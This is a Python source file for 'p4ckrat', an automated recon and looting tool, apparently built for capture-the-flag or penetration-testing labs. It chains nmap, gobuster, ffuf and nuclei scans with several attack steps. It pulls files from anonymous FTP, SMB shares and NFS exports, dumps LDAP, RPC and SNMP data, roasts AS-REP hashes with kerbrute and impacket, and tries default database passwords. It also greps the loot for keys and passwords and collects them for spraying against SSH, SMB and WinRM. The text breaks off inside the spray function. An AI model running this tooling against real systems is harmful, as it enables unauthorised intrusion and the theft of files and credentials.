#!/usr/bin/env python3
r"""p4ckrat - full-auto recon & loot grabber (by p4cket). See README.md."""
import os
import re
import sys
import time
import signal
import shutil
import ftplib
import argparse
import tempfile
import threading
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

SCRIPT_DIR = Path(__file__).resolve().parent

def _find_seclists():
    for p in (SCRIPT_DIR.parent/"wordlists"/"SecLists",
              SCRIPT_DIR/"wordlists"/"SecLists",
              Path("/usr/share/seclists"),
              Path("/usr/share/wordlists/seclists")):
        if p.exists():
            return p
    return Path("/usr/share/seclists")
SECLISTS = _find_seclists()

WORDLIST         = SECLISTS/"Discovery"/"Web-Content"/"raft-small-directories.txt"
RECURSE_WORDLIST = SECLISTS/"Discovery"/"Web-Content"/"common.txt"
USER_WORDLIST    = SECLISTS/"Usernames"/"top-usernames-shortlist.txt"
PASS_WORDLIST    = SECLISTS/"Passwords"/"Common-Credentials"/"10-million-password-list-top-100.txt"

DOMAIN          = ""
RATE            = 5000
THREADS         = 80
CONCURRENCY     = 4
ENABLE_HOSTS    = True
GOBUSTER_DEPTH  = 2          # Rekursionstiefe fuer gefundene Verzeichnisse
GOBUSTER_BUDGET = 12         # max. Anzahl gobuster-Laeufe gesamt (Explosionsschutz)
GOBUSTER_EXT    = "php,txt"  # angehaengte Datei-Endungen (leer = aus)
DO_GOBUSTER     = True       # wird beim Start per Abfrage gesetzt

FTP_MAX_DEPTH   = 8          # Schleifenschutz fuer rekursiven FTP-Pull
DO_UDP          = False      # paralleler UDP-Top-20-Scan (per --udp)
DO_SPRAY        = True       # gefundene Creds gegen SSH/SMB/WinRM/FTP spruehen
DO_NUCLEI       = False      # nuclei-Scan auf Web-Ports (per --nuclei)
VERBOSITY       = 1          # 0=quiet, 1=normal, 2=verbose
DRY_RUN         = False      # nur zeigen, welche Kommandos liefen

T_FULLSCAN = 480
T_SVCSCAN  = 360
T_GOBUSTER = 420
T_HYDRA    = 600
T_GENERIC  = 180

_P = {"g":"\033[32m","G":"\033[92m","c":"\033[36m","C":"\033[96m",
      "y":"\033[33m","Y":"\033[93m","r":"\033[91m","w":"\033[97m",
      "d":"\033[90m","b":"\033[1m","0":"\033[0m"}
if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
    _P = {k:"" for k in _P}
def col(k,s): return f"{_P[k]}{s}{_P['0']}"

_LOCK = threading.Lock()
_T0 = time.monotonic()
_ANSI = re.compile(r"\033\[[0-9;]*m")
_LOGF = None
_FINDF = None
def _ts(): return time.strftime("%H:%M:%S")
def _el(): return f"{time.monotonic()-_T0:.0f}s"
def emit(s=""):
    with _LOCK:
        print(s, flush=True)
        if _LOGF:
            try: _LOGF.write(_ANSI.sub("", s)+"\n"); _LOGF.flush()
            except Exception: pass

def set_logs(logf, findf):
    global _LOGF, _FINDF; _LOGF, _FINDF = logf, findf

_TAGCOL = {}
_PALETTE = ["c","G","Y","g","C","y"]
def _tagcolor(t):
    if t not in _TAGCOL: _TAGCOL[t] = _PALETTE[len(_TAGCOL) % len(_PALETTE)]
    return _TAGCOL[t]
def _pfx(t): return col(_tagcolor(t), t)+" " if t else ""

def info(s, t=None):
    if VERBOSITY >= 1: emit(col("c","[*] ")+_pfx(t)+s)
def ok(s,   t=None): emit(col("G","[+] ")+_pfx(t)+col("w",s))
def warn(s, t=None): emit(col("Y","[!] ")+_pfx(t)+s)
def err(s,  t=None): emit(col("r","[-] ")+_pfx(t)+s)
def raw(line, t=None):
    if VERBOSITY >= 1: emit("    "+_pfx(t)+col("d",line))
def dbg(s, t=None):
    if VERBOSITY >= 2: emit(col("d","[~] ")+_pfx(t)+col("d",s))

def finding(cat, text, t=None):
    if _FINDF:
        with _LOCK:
            try: _FINDF.write(f"[{_ts()}] {cat:<6} {text}\n"); _FINDF.flush()
            except Exception: pass
    emit(col("G","[+] ")+col(_tagcolor(t) if t else "G", cat.lower()+": ")+col("w",text))

def head(s):
    emit()
    emit(col("b",s.lower()))

# Eingesammelte Credentials (user, pass, quelle) fuer die Spray-/Pivot-Phase.
_CREDS = []
_CREDS_LOCK = threading.Lock()
def add_cred(user, pw, source):
    if not user or pw is None: return
    with _CREDS_LOCK:
        if (user, pw) not in [(u, p) for u, p, _ in _CREDS]:
            _CREDS.append((user, pw, source))

BANNER = r"""
          _____          __                   __
______   /  |  |   ____ |  | ______________ _/  |_
\____ \ /   |  |__/ ___\|  |/ /\_  __ \__  \\   __\
|  |_> >    ^   /\  \___|    <  |  | \// __ \|  |
|   __/\____   |  \___  >__|_ \ |__|  (____  /__|
|__|        |__|      \/     \/            \/"""
def banner(ip):
    emit(col("G", col("b", BANNER)))
    emit(col("d","   full-auto recon & loot grabber - by p4cket - github.com/pwl-de"))
    emit(col("d",f"   target {ip}   started {_ts()}"))
    emit(col("d",f"   lists {SECLISTS}"))
    emit()

def have(tool): return shutil.which(tool) is not None

_POSIX = (os.name == "posix")

def _popen(cmd, **kw):
    """Popen, das auf POSIX eine eigene Prozessgruppe aufmacht (sauberer Kill)."""
    if _POSIX:
        kw["start_new_session"] = True
    return subprocess.Popen(cmd, **kw)

def _killtree(p):
    """Kill p und - auf POSIX - die ganze Prozessgruppe (gobuster-Worker etc.)."""
    try:
        if _POSIX:
            os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        else:
            p.kill()
    except Exception:
        try: p.kill()
        except Exception: pass

def _dry(cmd, t=None):
    emit(col("y","[dry] ")+_pfx(t)+col("d"," ".join(cmd)))

def run(cmd, outfile=None, timeout=T_GENERIC):
    if DRY_RUN:
        _dry(cmd); return (0, "")
    dbg("exec "+" ".join(cmd))
    try:
        p = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                   text=True, errors="replace")
    except FileNotFoundError:
        return (127, "")
    try:
        out, _ = p.communicate(timeout=timeout)
        rc = p.returncode
    except subprocess.TimeoutExpired:
        _killtree(p)
        try: out, _ = p.communicate(timeout=5)
        except Exception: out = ""
        rc = 124
    out = out or ""
    if outfile: Path(outfile).write_text(out, errors="replace")
    return (rc, out)

def run_live(cmd, t=None, outfile=None, timeout=T_GENERIC, filt=None, echo=True):
    """Stream stdout live (tagged) + tee to file. filt(line)->bool filtert Ausgabe."""
    if DRY_RUN:
        _dry(cmd, t); return (0, "")
    dbg("exec "+" ".join(cmd), t)
    try:
        p = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                   text=True, errors="replace", bufsize=1)
    except FileNotFoundError:
        warn(f"not installed: {cmd[0]}", t); return (127, "")
    killer = threading.Timer(timeout, _killtree, args=(p,)); killer.start()
    buf = []
    try:
        for line in p.stdout:
            buf.append(line)
            ln = line.rstrip("\n")
            # -v zeigt alles, sonst nur gefilterte Zeilen
            if ln and ((echo and (filt is None or filt(ln))) or VERBOSITY >= 2):
                raw(ln, t)
        p.wait()
    finally:
        killer.cancel()
    text = "".join(buf)
    if outfile: Path(outfile).write_text(text, errors="replace")
    return (p.returncode or 0, text)

CRED_RE = re.compile("|".join([
    r"-----BEGIN (?:RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY-----",
    r"pass(?:word|wd|phrase)?\s*[:=]\s*\S+",
    r"\bpwd\s*[:=]\s*\S+",
    r"(?:api[_-]?key|secret|token|auth)\s*[:=]\s*\S+",
    r"user(?:name)?\s*[:=]\s*\S+",
    r"(?:mysql|postgres|mongodb|mssql|jdbc)://\S+",
    r"\bconnectionstring\b.*",
    r"AKIA[0-9A-Z]{16}",
    r"\b[\w.+-]+@[\w-]+\.[\w.-]+:\S+",
    r"\b(?:sa|root|admin|administrator)\s*[:=/]\s*\S+",
]), re.IGNORECASE)
SKIP_EXT = {".png",".jpg",".jpeg",".gif",".ico",".pdf",".zip",".gz",".exe",
            ".dll",".so",".bin",".woff",".woff2",".ttf",".mp3",".mp4",".css",".svg"}

def scan_creds(root):
    root = Path(root); hits = []
    if not root.exists(): return hits
    for f in root.rglob("*"):
        if not f.is_file() or f.suffix.lower() in SKIP_EXT: continue
        try:
            if f.stat().st_size > 5_000_000: continue
            text = f.read_text(errors="replace")
        except OSError:
            continue
        for i, line in enumerate(text.splitlines(), 1):
            if CRED_RE.search(line):
                hits.append(f"{f}:{i}: {line.strip()[:200]}")
    return hits

def udp_scan(ip, svcmap):
    """UDP-Top-20 parallel - findet DNS/SNMP/TFTP etc. Ergaenzt svcmap."""
    info("udp top-20 scan", "nmap")
    _, o = run_live(["nmap","-sU","--top-ports","20","--open","-Pn","-n", ip],
                    t="nmap", timeout=T_SVCSCAN,
                    filt=lambda l: "/udp" in l and "open" in l)
    for m in re.finditer(r"(\d+)/udp\s+open\s+(\S+)", o):
        port, name = m.group(1), m.group(2)
        if port not in svcmap:
            svcmap[port] = (name, "udp")
    udp = sorted({m.group(1) for m in re.finditer(r"(\d+)/udp\s+open", o)}, key=int)
    if udp: ok("Offene UDP-Ports: "+col("G",", ".join(udp)), "nmap")

def portscan(ip):
    head("PORT-SCAN")
    info("full port scan (all 65535 ports)", "nmap")
    _, full = run_live(["nmap","-p-","--min-rate",str(RATE),"-T4","-Pn","-n","-v", ip],
             t="nmap", timeout=T_FULLSCAN,
             filt=lambda l: "Discovered open port" in l or "Completed" in l or "scan report" in l)
    ports = sorted({m.group(1) for m in
                    re.finditer(r"Discovered open port (\d+)/tcp", full)}, key=int)
    svcmap = {}
    if not ports:
        warn("no open tcp ports, trying udp top-50", "nmap")
        run_live(["nmap","-sU","--top-ports","50","-Pn","-n", ip],
                 t="nmap", timeout=T_SVCSCAN)
        return {}, ""
    ok("Offene Ports: "+col("G",", ".join(ports)), "nmap")
    info("service scan on open ports", "nmap")
    _, svc = run_live(["nmap","-p",",".join(ports),"-sCV","-Pn","-n", ip],
                      t="nmap", timeout=T_SVCSCAN,
                      filt=lambda l: bool(re.match(r"\d+/tcp", l)) or "|" in l)
    for line in svc.splitlines():
        m = re.match(r"\s*(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
        if m: svcmap[m.group(1)] = (m.group(2), m.group(3))
    if DO_UDP:
        udp_scan(ip, svcmap)
    return svcmap, svc

def guess_hostname(ip, svc):
    if DOMAIN: return DOMAIN
    m = re.search(r"redirect to https?://([A-Za-z0-9.\-]+)", svc)
    if m: return m.group(1).strip("/")
    m = re.search(r"commonName=([A-Za-z0-9.\-]+)", svc)
    if m and not m.group(1).replace(".","").isdigit(): return m.group(1)
    m = re.search(r"DNS:([A-Za-z0-9.\-]+)", svc)
    if m: return m.group(1)
    if have("curl"):
        _, o = run(["curl","-skI","-m","10",f"http://{ip}/"], timeout=15)
        m = re.search(r"(?i)^location:\s*https?://([A-Za-z0-9.\-]+)", o, re.M)
        if m and not m.group(1).replace(".","").isdigit(): return m.group(1)
    return ""

_HOSTS_LOCK = threading.Lock()
def add_host(ip, host):
    if not (ENABLE_HOSTS and host): return
    if not _POSIX:
        warn(f"/etc/hosts nur auf Linux/macOS. Manuell: {ip} {host}", "hosts"); return
    if DRY_RUN:
        emit(col("y","[dry] ")+_pfx("hosts")+col("d",f"echo '{ip}\t{host}' >> /etc/hosts")); return
    with _HOSTS_LOCK:
        try:
            hp = Path("/etc/hosts"); content = hp.read_text()
            if re.search(rf"\b{re.escape(host)}\b", content): return
            with hp.open("a") as f: f.write(f"{ip}\t{host}\n")
            ok(f"/etc/hosts += {ip} {host}", "hosts")
        except PermissionError:
            warn(f"/etc/hosts nicht schreibbar (root). Manuell: {ip} {host}", "hosts")
        except OSError as e:
            warn(f"/etc/hosts: {e}", "hosts")

def ftp_anon(ip, out):
    info("checking anonymous ftp", "ftp")
    if DRY_RUN:
        emit(col("y","[dry] ")+_pfx("ftp")+col("d",f"ftplib anonymous@{ip}:21 + recursive RETR")); return
    dest = out/"files"/"ftp"   # erst anlegen, wenn wirklich eine Datei kommt
    try:
        ftp = ftplib.FTP(); ftp.connect(ip, 21, timeout=15)
        ftp.login("anonymous","anonymous@")
        finding("FTP", "anonymous login allowed", "ftp")
        ok("anonymous login ok, downloading all files", "ftp")
    except Exception as e:
        warn(f"no anon ftp: {e}", "ftp"); return
    n = [0]; seen = set()
    def is_dir(name):
        # Verzeichnis = wir koennen hineinwechseln. Vor/Nach-Pfad merken.
        try:
            cur = ftp.pwd(); ftp.cwd("/"+name.strip("/")); ftp.cwd(cur); return True
        except Exception:
            return False
    def pull(path="", depth=0):
        if depth > FTP_MAX_DEPTH:
            warn(f"max depth reached at {path}", "ftp"); return
        try: items = ftp.nlst(path)
        except Exception: return
        for it in items:
            if it in (".",".."): continue
            name = it if (not path or it.startswith(path)) else f"{path.rstrip('/')}/{it}"
            key = name.strip("/")
            if key in seen: continue        # Schleifenschutz (zyklische Links)
            seen.add(key)
            if is_dir(name):
                pull(name, depth+1)
            else:
                local = dest/name.lstrip("/"); local.parent.mkdir(parents=True, exist_ok=True)
                try:
                    with open(local,"wb") as fh: ftp.retrbinary("RETR "+name, fh.write)
                    n[0]+=1; raw("get "+name, "ftp")
                except Exception: pass
    try: pull()
    finally:
        try: ftp.quit()
        except Exception: pass
    if n[0]:
        ok(f"{n[0]} file(s) -> {dest}", "ftp")
    else:
        warn("anon login ok, aber keine Dateien gefunden", "ftp")

def _smb_auth(user=None, pw=None):
    """smbclient/smbmap-Auth-Argumente: None/leer = Null-Session (-N)."""
    if user:
        return (["-U", f"{user}%{pw or ''}"], f"{user}")
    return (["-N"], "anon")

def smb_grab(ip, out, user=None, pw=None):
    """Shares auflisten und lesbare rekursiv ziehen. Mit oder ohne Creds."""
    if not have("smbclient"):
        warn("smbclient missing, skipping share grab", "smb"); return
    auth, label = _smb_auth(user, pw)
    sub = "smb" if not user else f"smb_{re.sub(r'[^A-Za-z0-9]+','_',user)}"
    dest = out/"files"/sub
    _, listing = run(["smbclient", *auth, "-L", f"//{ip}/"], timeout=T_GENERIC)
    shares = [s for s in re.findall(r"^\s*(\S+)\s+Disk", listing, re.M)
              if s.upper() not in ("ADMIN$","IPC$","C$","PRINT$")]
    if not shares:
        warn(f"no readable shares ({label})", "smb"); return
    finding("SMB", f"readable shares ({label}): "+", ".join(shares), "smb")
    for sh in shares:
        sdir = dest/sh; sdir.mkdir(parents=True, exist_ok=True)
        info(f"grabbing share '{sh}' ({label})", "smb")
        run(["smbclient", *auth, f"//{ip}/{sh}","-c",
             f"recurse ON; prompt OFF; lcd {sdir}; mget *"], timeout=T_GENERIC)
        if not any(sdir.rglob("*")):   # Share war leer / nichts lesbar
            shutil.rmtree(sdir, ignore_errors=True)
    if dest.exists() and any(dest.rglob("*")):
        ok(f"SMB-Files ({label}) -> {dest}", "smb")
    else:
        shutil.rmtree(dest, ignore_errors=True)
        warn(f"shares gelistet, aber keine Dateien ladbar ({label})", "smb")

def smb_anon(ip, out):
    info("enumerate SMB (139/445)", "smb")
    if have("smbmap"):
        run_live(["smbmap","-H",ip], t="smb", timeout=T_GENERIC,
                 filt=lambda l: "READ" in l or "Disk" in l or "ANONYMOUS" in l)
    # Named-Pipe / Null-Session-Check
    if have("smbclient"):
        _, ipc = run(["smbclient","-N","//"+ip+"/IPC$","-c","help"], timeout=60)
        if ipc and "NT_STATUS_ACCESS_DENIED" not in ipc:
            dbg("IPC$ null-session reachable", "smb")
    # User-Enum: enum4linux-ng bevorzugt, sonst rpcclient RID-Cycling
    users = []
    if have("enum4linux-ng"):
        info("enum4linux-ng (users/shares/policy)", "smb")
        _, o = run_live(["enum4linux-ng","-A", ip], t="smb", timeout=T_SVCSCAN,
                        filt=lambda l: "user:" in l.lower() or "[+]" in l)
        users = sorted(set(re.findall(r"(?i)username:\s*([^\s,]+)", o)))
    elif have("rpcclient"):
        info("rpcclient RID-cycling (enumdomusers)", "smb")
        _, o = run(["rpcclient","-U","","-N",ip,"-c","enumdomusers"], timeout=T_GENERIC)
        users = sorted(set(re.findall(r"user:\[([^\]]+)\]", o)))
    if users:
        finding("SMB", "domain users: "+", ".join(users[:40]), "smb")
        try:
            (out/"files").mkdir(parents=True, exist_ok=True)
            (out/"files"/"smb_users.txt").write_text("\n".join(users)+"\n")
        except OSError:
            pass
    smb_grab(ip, out)   # anonyme Shares

def _parse_gobuster(text):
    """-> Liste (path, status, is_dir)."""
    res = []
    for m in re.finditer(r"^(\/\S*)\s+\(Status:\s*(\d+)\)(.*)$", text, re.M):
        path, st, rest = m.group(1), m.group(2), m.group(3)
        red = re.search(r"-->\s*(\S+)", rest)
        redt = red.group(1).strip("]") if red else ""
        is_dir = (st in ("301","302") and redt.endswith("/")) \
                 or (st == "200" and "." not in path.rsplit("/",1)[-1])
        res.append((path, st, bool(is_dir)))
    return res

def gobuster_recursive(base, tag, budget):
    """Rekursives gobuster. Treffer -> findings, keine Datei-Dumps."""
    if not have("gobuster"):
        warn("gobuster missing", tag); return
    if not WORDLIST.exists():
        warn(f"wordlist missing: {WORDLIST}", tag); return
    seen = set(); queue = [(base.rstrip("/")+"/", 0)]
    while queue and budget[0] > 0:
        url, depth = queue.pop(0)
        if url in seen: continue
        seen.add(url); budget[0] -= 1
        wl = WORDLIST if depth == 0 else RECURSE_WORDLIST
        info(f"gobuster d{depth} {url}  ({wl.name})", tag)
        gcmd = ["gobuster","dir","-u",url,"-w",str(wl),"-t",str(THREADS),
                "-q","-k","--no-error","--timeout","10s"]
        if GOBUSTER_EXT: gcmd += ["-x",GOBUSTER_EXT]
        _, txt = run_live(gcmd, t=tag, timeout=T_GOBUSTER, echo=False,
                          filt=lambda l: "Status:" in l)
        for path, st, is_dir in _parse_gobuster(txt):
            finding("WEB", f"{url.rstrip('/')}{path}  ({st})", tag)
            if is_dir and depth < GOBUSTER_DEPTH:
                child = url.rstrip("/")+path if path.startswith("/") else url+path
                child = child.rstrip("/")+"/"
                if child not in seen:
                    queue.append((child, depth+1))

# Spannende Dinge im HTML: Credentials, Flags, Hinweise, Kommentare.
WEB_HINT_RE = re.compile(
    r"(?i)(pass(?:word|wd|phrase)?\s*[:=]?\s*\S*"
    r"|user(?:name)?\s*[:=]?\s*\S*"
    r"|api[_-]?key|secret|token|auth[_-]?key"
    r"|flag\{[^}]*\}|todo|fixme|<!--.*?-->)")

def web(ip, port, out, host):
    """Nur Index holen. Datei wird NUR gespeichert, wenn im HTML etwas Spannendes steckt."""
    tag = f"web:{port}"
    scheme = "https" if port in ("443","8443") else "http"
    info(f"fetch web index ({scheme})", tag)
    if not have("curl"):
        warn("curl missing, skipping web", tag); return
    seen_urls = set()
    for url in ([f"{scheme}://{host}:{port}/"] if host else []) + [f"{scheme}://{ip}:{port}/"]:
        if url in seen_urls: continue
        seen_urls.add(url)
        _, body = run(["curl","-sk","-m","15","-L",url], timeout=30)
        if not body: continue
        tt = re.search(r"(?is)<title>(.*?)</title>", body)
        if tt: info(f"{url}  <title> {tt.group(1).strip()[:70]}", tag)
        hints = []
        for m in WEB_HINT_RE.finditer(body):
            s = m.group(0).strip().replace("\n"," ")[:120]
            if s and s.lower() not in (h.lower() for h in hints): hints.append(s)
            if len(hints) >= 8: break
        if not hints:
            continue  # nichts Spannendes -> keine Datei, kein web-Ordner
        wd = out/"files"/"web"; wd.mkdir(parents=True, exist_ok=True)
        tagf = re.sub(r"\W+","_",url).strip("_")
        page = wd/f"{tagf}.html"
        page.write_text(body, errors="replace")
        finding("WEB", f"interesting html at {url} -> {page}", tag)
        for h in hints: raw("hint "+h, tag)
    if DO_GOBUSTER:
        primary = host or ip
        gobuster_recursive(f"{scheme}://{primary}:{port}", tag, [GOBUSTER_BUDGET])
    vhost_fuzz(ip, port, scheme, host, tag)
    if DO_NUCLEI:
        nuclei_scan(ip, port, scheme, host, tag)

def vhost_fuzz(ip, port, scheme, host, tag):
    """vhost-Brute via ffuf Host:-Header. Braucht eine Domain (DOMAIN oder host)."""
    base = DOMAIN or (host.split(".",1)[-1] if host and "." in host else "")
    if not base:
        dbg("vhost fuzz skipped (keine domain)", tag); return
    if not have("ffuf"):
        dbg("ffuf missing, vhost fuzz skipped", tag); return
    wl = SECLISTS/"Discovery"/"DNS"/"subdomains-top1million-5000.txt"
    if not wl.exists():
        dbg(f"vhost wordlist missing: {wl.name}", tag); return
    info(f"vhost fuzzing *.{base} ({wl.name})", tag)
    # Erst Baseline-Groesse ermitteln waere ideal; ffuf -ac filtert automatisch.
    _, o = run_live(["ffuf","-u",f"{scheme}://{ip}:{port}/","-H",f"Host: FUZZ.{base}",
                     "-w",str(wl),"-t",str(THREADS),"-ac","-s"],
                    t=tag, timeout=T_GOBUSTER, echo=False)
    for sub in sorted(set(l.strip() for l in o.splitlines() if l.strip())):
        if re.fullmatch(r"[A-Za-z0-9_.-]+", sub):
            vhost = f"{sub}.{base}"
            finding("VHOST", f"{vhost} (Host-header on {ip}:{port})", tag)
            add_host(ip, vhost)

def nuclei_scan(ip, port, scheme, host, tag):
    if not have("nuclei"):
        dbg("nuclei missing", tag); return
    target = f"{scheme}://{host or ip}:{port}/"
    info(f"nuclei {target}", tag)
    _, o = run_live(["nuclei","-u",target,"-silent","-nc",
                     "-severity","medium,high,critical"],
                    t=tag, timeout=T_GOBUSTER, echo=False)
    for line in o.splitlines():
        line = line.strip()
        if line.startswith("["):
            finding("NUCLEI", line[:180], tag)

def kerberos(ip, out, host):
    info("enumerate Kerberos/AD (88)", "krb")
    dom = DOMAIN or (host.split(".",1)[-1] if host and "." in host else host) or ""
    if not dom and have("nmap"):
        _, o = run(["nmap","-p389","--script","ldap-rootdse","-Pn","-n",ip], timeout=T_GENERIC)
        m = re.search(r"DC=([A-Za-z0-9\-]+),DC=([A-Za-z0-9\-]+)", o)
        if m: dom = f"{m.group(1)}.{m.group(2)}"
    if not dom:
        warn("domain unknown, set DOMAIN in config, skipping", "krb"); return
    ok(f"Domain: {dom}", "krb")
    tmp = Path(tempfile.mkdtemp(prefix="p4ckrat_krb_"))
    users = tmp/"users.txt"   # nur Zwischenliste fuer GetNPUsers
    try:
        if have("kerbrute") and USER_WORDLIST.exists():
            info("kerbrute userenum ...", "krb")
            _, o = run_live(["kerbrute","userenum","-d",dom,"--dc",ip,str(USER_WORDLIST)],
                            t="krb", timeout=T_GENERIC,
                            filt=lambda l: "VALID" in l or "+" in l)
            found = sorted(set(re.findall(r"VALID USERNAME:\s+([^@\s]+)", o)))
            if found:
                users.write_text("\n".join(found)+"\n")
                finding("KRB", "valid users: "+", ".join(found), "krb")
        if not users.exists() and USER_WORDLIST.exists():
            shutil.copy(USER_WORDLIST, users)
        gnp = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if gnp and users.exists():
            info("AS-REP Roasting (GetNPUsers) ...", "krb")
            _, o = run_live([gnp, f"{dom}/","-no-pass","-dc-ip",ip,"-usersfile",str(users)],
                            t="krb", timeout=T_GENERIC,
                            filt=lambda l: "krb5asrep" in l or "error" in l.lower())
            hashes = re.findall(r"\$krb5asrep\$\S+", o)
            if hashes:   # echter Loot -> files/ anlegen
                dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
                hf = dest/"asrep_hashes.txt"; hf.write_text("\n".join(hashes)+"\n")
                finding("KRB", f"AS-REP Hash -> {hf} (hashcat -m 18200)", "krb")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

def ldap_enum(ip, out, host):
    info("enumerate LDAP (389/636)", "ldap")
    if not have("ldapsearch"):
        warn("ldapsearch missing", "ldap"); return
    # rootDSE -> naming contexts
    _, root = run(["ldapsearch","-x","-H",f"ldap://{ip}","-s","base",
                   "namingContexts"], timeout=T_GENERIC)
    ctxs = re.findall(r"(?i)namingContexts:\s*(\S+)", root)
    if ctxs:
        finding("LDAP", "naming contexts: "+", ".join(ctxs), "ldap")
    base = ctxs[0] if ctxs else (
        ",".join(f"DC={p}" for p in (DOMAIN or host or "").split(".") if p) or None)
    if not base:
        warn("no base DN (anonymous bind leer / keine domain)", "ldap"); return
    info(f"anonymous bind dump ({base})", "ldap")
    _, o = run(["ldapsearch","-x","-H",f"ldap://{ip}","-b",base], timeout=T_SVCSCAN)
    if o and "ldap_bind" not in o.lower():
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        f = dest/"ldap_dump.txt"; f.write_text(o, errors="replace")
        users = sorted(set(re.findall(r"(?i)^sAMAccountName:\s*(\S+)", o, re.M)))
        finding("LDAP", f"anonymous dump -> {f}"+(f" ({len(users)} users)" if users else ""), "ldap")
        if users:
            (dest/"ldap_users.txt").write_text("\n".join(users)+"\n")
    else:
        warn("anonymous bind liefert nichts", "ldap")

def snmp_enum(ip, out):
    info("enumerate SNMP (udp/161, community 'public')", "snmp")
    tool = "snmpwalk" if have("snmpwalk") else ("snmpbulkwalk" if have("snmpbulkwalk") else "")
    if not tool:
        warn("snmpwalk missing", "snmp"); return
    _, o = run([tool,"-v2c","-c","public","-t","3","-r","1", ip], timeout=T_SVCSCAN)
    if not o or "Timeout" in o or "No Such" in o and o.count("\n") < 3:
        warn("no SNMP response (public)", "snmp"); return
    lines = [l for l in o.splitlines() if l.strip()]
    if len(lines) < 2:
        warn("SNMP leer", "snmp"); return
    dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
    f = dest/"snmp_public.txt"; f.write_text(o, errors="replace")
    finding("SNMP", f"community 'public' readable -> {f} ({len(lines)} OIDs)", "snmp")

def nfs_enum(ip, out):
    info("enumerate NFS (111/2049)", "nfs")
    if not have("showmount"):
        warn("showmount missing", "nfs"); return
    _, o = run(["showmount","-e",ip], timeout=T_GENERIC)
    exports = re.findall(r"^(/\S+)", o, re.M)
    if not exports:
        warn("no NFS exports", "nfs"); return
    finding("NFS", "exports: "+", ".join(exports), "nfs")
    if DRY_RUN or not _POSIX or not have("mount"):
        return
    dest = out/"files"/"nfs"
    for ex in exports:
        mp = Path(tempfile.mkdtemp(prefix="p4ckrat_nfs_"))
        rc, _ = run(["mount","-o","ro,soft,nolock",f"{ip}:{ex}",str(mp)], timeout=60)
        if rc == 0 and any(mp.iterdir()):
            local = dest/ex.strip("/").replace("/","_"); local.mkdir(parents=True, exist_ok=True)
            try:
                for item in mp.rglob("*"):
                    if item.is_file() and item.stat().st_size < 5_000_000:
                        rel = item.relative_to(mp); tgt = local/rel
                        tgt.parent.mkdir(parents=True, exist_ok=True)
                        shutil.copy2(item, tgt)
                ok(f"NFS {ex} -> {local}", "nfs")
            except OSError: pass
        run(["umount",str(mp)], timeout=30)
        shutil.rmtree(mp, ignore_errors=True)

def rpc_enum(ip, out):
    info("enumerate RPC (null session)", "rpc")
    if not have("rpcclient"):
        warn("rpcclient missing", "rpc"); return
    _, o = run(["rpcclient","-U","","-N",ip,"-c","enumdomusers;enumdomgroups;querydominfo"],
               timeout=T_GENERIC)
    users = sorted(set(re.findall(r"user:\[([^\]]+)\]", o)))
    if users:
        finding("RPC", "domain users: "+", ".join(users[:40]), "rpc")
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        (dest/"rpc_users.txt").write_text("\n".join(users)+"\n")
    else:
        warn("null-session rpc liefert keine User", "rpc")

# (service, default-user, default-pass-liste) je DB-Port
_DB_DEFAULTS = {
    "mssql":    ("sa",       ["", "sa", "Password123", "password"]),
    "mysql":    ("root",     ["", "root", "toor", "password"]),
    "postgres": ("postgres", ["", "postgres", "password"]),
}
def db_probe(ip, port, kind, out):
    info(f"probe {kind} default creds (:{port})", kind)
    user, pws = _DB_DEFAULTS[kind]
    for pw in pws:
        rc = None
        if kind == "mysql" and have("mysql"):
            rc, _ = run(["mysql","-h",ip,"-u",user,f"-p{pw}","-e","SELECT 1"], timeout=30)
        elif kind == "postgres" and have("psql"):
            env_pw = pw
            r = subprocess.run(["psql","-h",ip,"-U",user,"-c","SELECT 1","-w"],
                               capture_output=True, text=True,
                               env={**os.environ,"PGPASSWORD":env_pw}, timeout=30) \
                if not DRY_RUN else None
            if DRY_RUN:
                _dry(["psql","-h",ip,"-U",user,"-c","SELECT 1"], kind); return
            rc = r.returncode
        elif kind == "mssql" and (have("impacket-mssqlclient") or have("mssqlclient.py")):
            tool = shutil.which("impacket-mssqlclient") or shutil.which("mssqlclient.py")
            rc, o = run([tool, f"{user}:{pw}@{ip}","-command","SELECT 1"], timeout=30)
            if rc == 0 and "Login failed" in (o or ""): rc = 1
        else:
            warn(f"client for {kind} missing, skipping", kind); return
        if rc == 0:
            finding("CREDS", f"{kind} default login {user}:{pw or '<empty>'}", kind)
            add_cred(user, pw, kind)
            return
    warn(f"no {kind} default creds", kind)

def redis_enum(ip, out):
    info("enumerate Redis (6379, unauth)", "redis")
    if not have("redis-cli"):
        warn("redis-cli missing", "redis"); return
    rc, o = run(["redis-cli","-h",ip,"-t","5","INFO","server"], timeout=30)
    if rc == 0 and "redis_version" in (o or ""):
        ver = re.search(r"redis_version:(\S+)", o)
        finding("REDIS", f"unauthenticated access (v{ver.group(1) if ver else '?'})", "redis")
        _, keys = run(["redis-cli","-h",ip,"-t","5","KEYS","*"], timeout=30)
        klist = [k for k in (keys or "").splitlines() if k.strip()][:20]
        if klist:
            finding("REDIS", "keys: "+", ".join(klist), "redis")
    elif "NOAUTH" in (o or ""):
        warn("redis requires auth", "redis")
    else:
        warn("no redis response", "redis")

def rsync_enum(ip, out):
    info("enumerate rsync (873, anon modules)", "rsync")
    if not have("rsync"):
        warn("rsync missing", "rsync"); return
    _, o = run(["rsync","--list-only","--timeout","15",f"rsync://{ip}/"], timeout=T_GENERIC)
    mods = [m.group(1) for m in re.finditer(r"^(\S+)\s+", o, re.M)
            if not m.group(1).startswith("@")]
    if mods:
        finding("RSYNC", "modules: "+", ".join(mods), "rsync")
    else:
        warn("no anonymous rsync modules", "rsync")

def spray_creds(ip, svcmap, out):
    """Gefundene user:pass gegen SSH/SMB/WinRM/FTP spruehen (Pivot-Phase)."""
    if not DO_SPRAY: return
    with _CREDS_LOCK:
        creds = list(_CREDS)
    if not creds:
        return
